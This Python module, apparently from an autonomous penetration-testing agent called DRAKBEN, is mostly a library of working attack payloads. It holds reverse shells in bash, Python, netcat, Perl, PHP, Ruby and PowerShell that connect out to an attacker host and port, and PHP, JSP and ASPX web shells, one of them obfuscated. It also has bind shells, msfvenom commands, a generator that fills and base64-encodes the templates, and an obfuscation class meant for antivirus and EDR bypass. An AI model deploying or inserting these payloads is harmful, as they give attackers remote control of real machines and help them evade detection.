# modules/payload.py
# DRAKBEN Payload Module - STATE-AWARE Advanced Level
# REQUIRED: Payload FORBIDDEN without foothold
# Enhanced: Logging, better error handling, more payload types

import base64
import logging
from typing import Any

# Setup logger
logger = logging.getLogger(__name__)

# Constants
STATE_INVARIANT_VIOLATION = "State invariant violation"

# State integration
try:
    from core.agent.state import AgentState, AttackPhase

    STATE_AVAILABLE = True
except ImportError:
    STATE_AVAILABLE = False
    logger.warning("State module not available")


def check_payload_preconditions(state: "AgentState") -> tuple[bool, str]:
    """Payload precondition check - STRICTLY REQUIRED.

    RULE: Payload FORBIDDEN without foothold.

    Args:
        state: AgentState instance

    Returns:
        (can_execute, reason)

    """
    logger.debug("Checking payload preconditions")

    if not STATE_AVAILABLE or not state:
        logger.warning("State tracking not available")
        return False, "State tracking is required for payload execution"

    # Precondition 1: PAYLOAD FORBIDDEN WITHOUT FOOTHOLD
    if not state.has_foothold:
        logger.warning("Payload blocked: No foothold established")
        return False, "FORBIDDEN: Payload requires foothold first"

    # Precondition 2: Must be in appropriate phase
    if state.phase not in [AttackPhase.FOOTHOLD, AttackPhase.POST_EXPLOIT]:
        logger.warning(
            f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT",
        )
        return False, f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT"

    logger.info("Payload preconditions satisfied")
    return True, "Preconditions satisfied"


# -------------------------
# Payload Templates
# -------------------------
PAYLOAD_TEMPLATES = {
    "reverse_shell_bash": {
        "code": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "description": "Bash reverse shell",
        "os": "linux",
        "requires": ["bash"],
    },
    "reverse_shell_python": {
        "code": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'""",
        "description": "Python reverse shell",
        "os": "linux",
        "requires": ["python3"],
    },
    "reverse_shell_python_windows": {
        "code": '''python -c "import socket,subprocess;s=socket.socket();s.connect(('{lhost}',{lport}));[subprocess.Popen(['cmd.exe'],stdin=s,stdout=s,stderr=s)]"''',
        "description": "Python reverse shell for Windows",
        "os": "windows",
        "requires": ["python"],
    },
    "reverse_shell_nc": {
        "code": "nc -e /bin/sh {lhost} {lport}",
        "description": "Netcat reverse shell",
        "os": "linux",
        "requires": ["nc"],
    },
    "reverse_shell_nc_mkfifo": {
        "code": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "description": "Netcat reverse shell with mkfifo (no -e flag)",
        "os": "linux",
        "requires": ["nc", "mkfifo"],
    },
    "reverse_shell_perl": {
        "code": """perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'\'""",
        "description": "Perl reverse shell",
        "os": "linux",
        "requires": ["perl"],
    },
    "reverse_shell_php": {
        "code": """php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'\'""",
        "description": "PHP reverse shell",
        "os": "linux",
        "requires": ["php"],
    },
    "reverse_shell_ruby": {
        "code": """ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\'""",
        "description": "Ruby reverse shell",
        "os": "linux",
        "requires": ["ruby"],
    },
    "reverse_shell_powershell": {
        "code": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]:ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
        "description": "PowerShell reverse shell",
        "os": "windows",
        "requires": ["powershell"],
    },
    "web_shell_php": {
        "code": """<?php if(isset($_REQUEST['cmd'])){{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }} ?>""",
        "description": "Simple PHP web shell",
        "os": "any",
        "requires": ["php"],
    },
    "web_shell_php_advanced": {
        "code": """<?php $k="drakben";if(isset($_POST[$k])){{@eval(base64_decode($_POST[$k]));}} ?>""",
        "description": "Obfuscated PHP web shell",
        "os": "any",
        "requires": ["php"],
    },
    "web_shell_jsp": {
        "code": """<%@ page import="java.util.*,java.io.*"%><% String cmd = request.getParameter("cmd"); if(cmd != null) {{ Process p = Runtime.getRuntime().exec(cmd); DataInputStream in = new DataInputStream(p.getInputStream()); String s = null; while((s = in.readLine()) != null) {{ out.println(s); }} }} %>""",
        "description": "JSP web shell",
        "os": "any",
        "requires": ["java"],
    },
    "web_shell_aspx": {
        "code": """<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% string cmd = Request["cmd"]; if(!string.IsNullOrEmpty(cmd)) {{ Process p = new Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); }} %>""",
        "description": "ASPX web shell",
        "os": "windows",
        "requires": ["aspx"],
    },
    "bind_shell_nc": {
        "code": "nc -lvnp {lport} -e /bin/sh",
        "description": "Netcat bind shell",
        "os": "linux",
        "requires": ["nc"],
    },
    "bind_shell_python": {
        "code": """python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'\'""",
        "description": "Python bind shell",
        "os": "linux",
        "requires": ["python3"],
    },
    "msfvenom_linux_reverse": {
        "code": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf",
        "description": "Metasploit Linux reverse shell ELF",
        "os": "linux",
        "requires": ["msfvenom"],
        "type": "generator",
    },
    "msfvenom_windows_reverse": {
        "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe",
        "description": "Metasploit Windows reverse shell EXE",
        "os": "windows",
        "requires": ["msfvenom"],
        "type": "generator",
    },
}


# -------------------------
# Generate Payload (Helper)
# -------------------------
def generate_payload(
    state: "AgentState",
    payload_type: str,
    lhost: str | None = None,
    lport: int = 4444,
    encode: bool = False,
) -> dict[str, Any]:
    """Generate various payload types.

    Args:
        state: AgentState instance
        payload_type: Type of payload (see PAYLOAD_TEMPLATES)
        lhost: Local host for reverse shell
        lport: Local port
        encode: Whether to base64 encode the payload

    Returns:
        dict with payload code and metadata

    """
    logger.info("Generating payload: %s", payload_type)

    if state is None:
        msg = "State is required for payload generation"
        raise RuntimeError(msg)

    # STATE VALIDATION
    if STATE_AVAILABLE and state and not state.validate():
        logger.error("%s in payload generation", STATE_INVARIANT_VIOLATION)
        return {
            "error": STATE_INVARIANT_VIOLATION,
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }

    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        logger.warning("Payload generation blocked: %s", reason)
        return {"error": reason, "blocked": True}

    payload_key = payload_type.lower()
    if payload_key not in PAYLOAD_TEMPLATES:
        logger.warning("Unknown payload type: %s", payload_type)
        return {
            "error": f"Unknown payload type: {payload_type}",
            "available": list(PAYLOAD_TEMPLATES.keys()),
        }

    template = PAYLOAD_TEMPLATES[payload_key]

    # Generate payload code
    try:
        code_template = str(template["code"])
        code = code_template.format(lhost=lhost or "LHOST", lport=lport)
    except KeyError as e:
        logger.exception("Missing parameter for payload: %s", e)
        return {"error": f"Missing parameter: {e}"}

    # Optionally encode
    if encode:
        code_bytes = code.encode("utf-8")
        code = base64.b64encode(code_bytes).decode("utf-8")
        logger.debug("Payload encoded to base64")

    logger.info("Payload generated successfully: %s", payload_type)

    return {
        "type": payload_type,
        "code": code,
        "description": template.get("description", ""),
        "os": template.get("os", "unknown"),
        "requires": template.get("requires", []),
        "lhost": lhost,
        "lport": lport,
        "encoded": encode,
        "success": True,
    }


def list_payloads(os_filter: str | None = None) -> list[dict[str, Any]]:
    """List available payload templates.

    Args:
        os_filter: Filter by OS (linux, windows, any)

    Returns:
        List of payload info dicts

    """
    logger.debug("Listing payloads with filter: %s", os_filter)

    payloads = []
    for name, template in PAYLOAD_TEMPLATES.items():
        if (
            os_filter
            and template.get("os") != os_filter
            and template.get("os") != "any"
        ):
            continue
        payloads.append(
            {
                "name": name,
                "description": template.get("description", ""),
                "os": template.get("os", "unknown"),
                "requires": template.get("requires", []),
            },
        )

    return payloads


# =========================================
# PAYLOAD OBFUSCATION & AV BYPASS
# =========================================


class PayloadObfuscator:
    """Payload obfuscation for AV/EDR bypass.

    Techniques:
    - String encoding (Base64, Hex, Unicode)
    - Variable substitution
    - Dead code injection
    - String concatenation
    - XOR encoding
    - Custom encoders
    """

    @staticmethod
    def hex_encode(payload: str) -> str:
        """Encode payload to hexadecimal."""
        return payload.encode().hex()

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Encode payload to Unicode escape sequences."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def xor_encode(payload: str, key: int = 0x41) -> tuple[str, int]:
        """XOR encode payload.

        Args:
            payload: Original payload
            key: XOR key (default 0x41)

        Returns:
            Tuple of (encoded_bytes_as_hex, key)

        """
        encoded = "".join(f"{ord(c) ^ key:02x}" for c in payload)
        return encoded, key
